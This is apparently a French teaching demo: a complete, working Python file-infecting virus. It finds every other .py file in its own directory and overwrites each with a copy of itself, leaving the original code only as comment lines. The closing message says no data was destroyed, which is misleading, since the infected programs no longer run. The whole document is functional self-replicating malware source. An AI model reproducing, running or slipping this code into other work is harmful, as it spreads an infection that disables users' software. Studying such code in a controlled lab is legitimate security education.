import os
import sys

SIGNATURE = "# === MARQUEUR_VIRUS_LAB ==="
MARQUEUR_FIN = "# === FIN_VIRUS_LAB ==="

def load_virus():
    with open(os.path.abspath(__file__), "r", encoding="utf-8") as f:
        return f.read()

def is_infected(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return SIGNATURE in f.read()
    except (UnicodeDecodeError, PermissionError):
        return False

def infect(file_path):
    if is_infected(file_path):
        print(f"  [=] Déjà infecté : {os.path.basename(file_path)}")
        return False

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            contenu_original = f.read()

        contenu_infecte = (
            f"{SIGNATURE}\n"
            f"# --- Début du code viral (démo ESIROI) ---\n"
            f"{load_virus()}\n"
            f"# --- Fin du code viral ---\n"
            f"{MARQUEUR_FIN}\n\n"
            f"# --- Code original de la cible (conservé pour la démo) ---\n"
            f"# {contenu_original.replace(chr(10), chr(10) + '# ')}\n"
        )

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(contenu_infecte)

        print(f"  [+] Infecté : {os.path.basename(file_path)}")
        return True

    except Exception as e:
        print(f"  [!] Erreur sur {file_path} : {e}")
        return False

def propager(folder_path):
    virus_abs = os.path.abspath(__file__)
    cibles = []

    for nom in os.listdir(folder_path):
        chemin = os.path.join(folder_path, nom)
        if (
            os.path.isfile(chemin)
            and chemin.endswith(".py")
            and os.path.abspath(chemin) != virus_abs
        ):
            cibles.append(chemin)

    print(f"[*] {len(cibles)} fichier(s) cible(s) trouvé(s) dans {folder_path}")
    for c in cibles:
        infect(c)

def message_demo():
    print("\n" + "=" * 50)
    print("  [DÉMO] Ceci est un virus pédagogique.")
    print("  Aucune donnée n'a été détruite.")
    print("  Aucune connexion réseau n'a été établie.")
    print("=" * 50 + "\n")

if __name__ == "__main__":
    repertoire = os.path.dirname(os.path.abspath(__file__))
    print(f"[*] Répertoire cible : {repertoire}")
    propager(repertoire)
    message_demo()
    print("[*] Propagation terminée. Relancez une cible infectée pour observer la charge utile.")